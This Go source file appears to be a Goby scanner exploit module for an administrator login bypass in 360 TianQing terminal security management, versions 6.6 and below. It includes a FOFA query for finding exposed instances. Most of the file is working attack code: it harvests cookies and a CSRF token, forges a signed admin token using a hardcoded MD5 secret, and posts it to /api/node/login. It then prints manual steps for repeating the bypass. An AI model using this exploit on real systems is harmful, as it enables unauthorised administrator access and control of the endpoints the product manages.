package exploits

import (
    "crypto/md5"
    "encoding/base64"
    "fmt"
    "git.gobies.org/goby/goscanner/goutils"
    "git.gobies.org/goby/goscanner/jsonvul"
    "git.gobies.org/goby/goscanner/scanconfig"
    "git.gobies.org/goby/httpclient"
    "strings"
    "time"
)

func init() {
    expJson := `{
    "Name": "360 SkyRock Terminal Security Management System is not authorized for administrator login",
    "Description": "<p>360 tianqin is an anti-virus software with terminal security control function launched by 360, specifically for government enterprises and other large enterprises and institutions, as a new generation of enterprise terminal security products, using a new security defense technology.</p><p>In version 6.6 and below, the login interface is vulnerable to bypass login.</p>",
    "Product": "Qianxin-TianQing",
    "Homepage": "https://www.360.cn",
    "DisclosureDate": "2022-03-30",
    "Author": "670420874@qq.com",
    "FofaQuery": "title=\"360新天擎\"",
    "GobyQuery": "title=\"360新天擎\"",
    "Level": "3",
    "Impact": "<p>It can cause an attacker to log into the backend as an administrator and control the user terminals managed by the system.</p>",
    "Recommendation": "<p>Go to the official website to upgrade tianqin to version 6.7.<a href=\"https://www.360.cn/\">https://www.360.cn/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/node/login",
                "Following": 1,
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "token=eyJob3N0IjoiMTI3LjAuMC4xIiwidCI6IjE2NDg1OTg5MDgiLCJmcm9tX3VzZXIiOiJhZG1pbiIsImZyb21fcG9ydCI6IjgwIiwiZnJvbV9pcCI6IjEyNy4wLjAuMSJ9&sign=24074ff81a6f17a220423b4acde0ad8c&enp=1bea7b44f4917cffe3fa13be406b6910"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/node/login",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "Following": 1,
                "data_type": "text",
                "data": "token=eyJob3N0IjoiMTI3LjAuMC4xIiwidCI6IjE2NDg1OTg5MDgiLCJmcm9tX3VzZXIiOiJhZG1pbiIsImZyb21fcG9ydCI6IjgwIiwiZnJvbV9pcCI6IjEyNy4wLjAuMSJ9&sign=24074ff81a6f17a220423b4acde0ad8c&enp=1bea7b44f4917cffe3fa13be406b6910"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "10",
    "Translation": {
        "CN": {
            "Name": "360 天擎终端安全管理系统未授权管理员登录",
            "Product": "奇安信-天擎",
            "Description": "<p>360天擎企业版是360推出的一款集终端安全管控功能的防病毒软件，专门面向政府企业等大型企事业单位而推出，作为新一代企业终端安全产品，采用了全新的安全防御技术。<br></p><p>在6.6及以下版本中，登录接口存在绕过登录的漏洞，<span style=\"color: rgb(22, 51, 102); font-size: 16px;\">攻击者可以使用管理员的身份登录后台，控制系统管理的用户终端。</span></p>",
            "Recommendation": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">前往官网升级天擎至6.7版本.</span><span style=\"color: rgb(22, 51, 102); font-size: 16px;\"><a href=\"https://www.360.cn/\">https://www.360.cn/</a></span><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\"><span style=\"color: rgb(22, 51, 102); font-size: 16px;\"><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">登录接口存在绕过登录的漏洞，</span>攻击者可以使用管理员的身份登录后台，控制系统管理的用户终端。</span></span></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "360 SkyRock Terminal Security Management System is not authorized for administrator login",
            "Product": "Qianxin-TianQing",
            "Description": "<p>360 tianqin is an anti-virus software with terminal security control function launched by 360, specifically for government enterprises and other large enterprises and institutions, as a new generation of enterprise terminal security products, using a new security defense technology.</p><p>In version 6.6 and below, the login interface is vulnerable to bypass login.</p>",
            "Recommendation": "<p>Go to the official website to upgrade tianqin to version 6.7.<a href=\"https://www.360.cn/\">https://www.360.cn/</a><br></p>",
            "Impact": "<p>It can cause an attacker to log into the backend as an administrator and control the user terminals managed by the system.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10839"
}`

  getCookiewueijdowiue := func(u *httpclient.FixUrl) string {
    cfg := httpclient.NewGetRequestConfig("/")
    cfg.Header.Store("Accept-Language", "zh-CN,zh;q=0.9")
    cfg.Header.Store("Accept-Encoding", "gzip, deflate")
    cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
    cfg.Header.Store("sec-ch-ua-platform", "\"Windows\"")
    cfg.Header.Store("Connection", "close")
    cfg.VerifyTls = false
    cfg.Timeout = 10
    cfg.FollowRedirect = false
    resp, err := httpclient.DoHttpRequest(u, cfg)
    if err != nil {
      return ""
    }
    if resp.StatusCode == 302 && resp.Header["Set-Cookie"] != nil {
      str := resp.Header.Get("Set-Cookie")
      str = strings.Replace(str, " path=/", "", 1)
      return str
    }
    return ""
  }
  getYII_CSRF_TOKENdwadawjioqewo := func(u *httpclient.FixUrl, cookies string) string {
    cfg := httpclient.NewGetRequestConfig("/login?refer=%2F")
    cfg.Header.Store("Accept-Language", "zh-CN,zh;q=0.9")
    cfg.Header.Store("Accept-Encoding", "gzip, deflate")
    cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
    cfg.Header.Store("sec-ch-ua-platform", "\"Windows\"")
    cfg.Header.Store("Cookie", cookies)
    cfg.Timeout = 60
    cfg.Header.Store("Connection", "close")
    cfg.VerifyTls = false
    cfg.FollowRedirect = false
    resp, err := httpclient.DoHttpRequest(u, cfg)
    if err != nil {
      return ""
    }
    if resp.StatusCode == 200 && resp.Header["Set-Cookie"] != nil {
      str := resp.Header.Get("Set-Cookie")
      str = strings.Replace(str, " path=/", "", 1)
      return cookies + " " + str
    }
    return ""
  }
  verifyCookiesdjiajdiuieqw := func(u *httpclient.FixUrl, cookies string) bool {
    time := fmt.Sprintf("%v", time.Now().Unix())
    jsonStr := []byte("{\"host\":\"127.0.0.1\",\"t\":\"" + time + "\",\"from_user\":\"admin\",\"from_port\":\"80\",\"from_ip\":\"127.0.0.1\"}")
    token := base64.StdEncoding.EncodeToString(jsonStr)
    data := []byte(token + "49347b132ffb7da976be1bc08ff47135" + time)
    sign := fmt.Sprintf("%x", md5.Sum(data))
    dataReq := fmt.Sprintf("token=%s&sign=%s&enp=%s", token, sign, "1bea7b44f4917cffe3fa13be406b6910")
    requestConfig := httpclient.NewPostRequestConfig("/api/node/login")
    requestConfig.VerifyTls = false
    requestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
    requestConfig.FollowRedirect = false
    requestConfig.Timeout = 10
    requestConfig.Data = dataReq
    requestConfig.Header.Store("Cookie", cookies)
    response, err := httpclient.DoHttpRequest(u, requestConfig)
    if err != nil {
      return false
    }
    if response.StatusCode == 302 {
      return true
    }
    return false
  }

  verifyLogindwjijaiodus := func(u *httpclient.FixUrl, cookies string) bool {
    cfg := httpclient.NewGetRequestConfig("/")
    cfg.Header.Store("Accept-Language", "zh-CN,zh;q=0.9")
    cfg.Header.Store("Accept-Encoding", "gzip, deflate")
    cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
    cfg.Header.Store("sec-ch-ua-platform", "\"Windows\"")
    cfg.Header.Store("Cookie", cookies)
    cfg.Header.Store("Connection", "close")
    cfg.VerifyTls = false
    cfg.FollowRedirect = false
    cfg.Timeout = 10
    resp, err := httpclient.DoHttpRequest(u, cfg)
    if err != nil {
      return false
    }
    if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "CPU使用率：") && strings.Contains(resp.Utf8Html, "/report/lite/haenhance") {
      return true
    }
    return false
  }

  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
      cookies := getCookiewueijdowiue(u)
      if len(cookies) > 2 {
        cookies2 := getYII_CSRF_TOKENdwadawjioqewo(u, cookies)
        fmt.Println(cookies2)
        if verifyCookiesdjiajdiuieqw(u, cookies2) {
          if verifyLogindwjijaiodus(u, cookies2) {
            return true
          }
        }
      }
      return false
    },
    func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
      cookies := getCookiewueijdowiue(expResult.HostInfo)
      if len(cookies) > 2 {
        cookies2 := getYII_CSRF_TOKENdwadawjioqewo(expResult.HostInfo, cookies)
        if verifyCookiesdjiajdiuieqw(expResult.HostInfo, cookies2) {
          time := fmt.Sprintf("%v", time.Now().Unix())
          jsonStr := []byte("{\"host\":\"127.0.0.1\",\"t\":\"" + time + "\",\"from_user\":\"admin\",\"from_port\":\"80\",\"from_ip\":\"127.0.0.1\"}")
          token := base64.StdEncoding.EncodeToString(jsonStr)
          data := []byte(token + "49347b132ffb7da976be1bc08ff47135" + time)
          sign := fmt.Sprintf("%x", md5.Sum(data))
          dataReq := fmt.Sprintf("token=%s&sign=%s&enp=%s", token, sign, "1bea7b44f4917cffe3fa13be406b6910")
          expResult.Success = true
          expResult.Output = "验证步骤1： 浏览器访问 " + expResult.HostInfo.FixedHostInfo + "/login?refer=%2F 获取浏览器中的cookie 如:SKYLARxxxxx=xxxxxx; YII_CSRF_TOKEN=xxxxxx  \n步骤2：在浏览器中向/api/node/login发送POST请求(建议使用HackBar)  \n请求头（记得加上Cookie）： Content-Type: application/x-www-form-urlencoded  Cookie: SKYLARxxx;YII_CSRF_TOKEN=xxxx  \nPOST内容：" + dataReq
        }
      }
      return expResult
    },
  ))
}
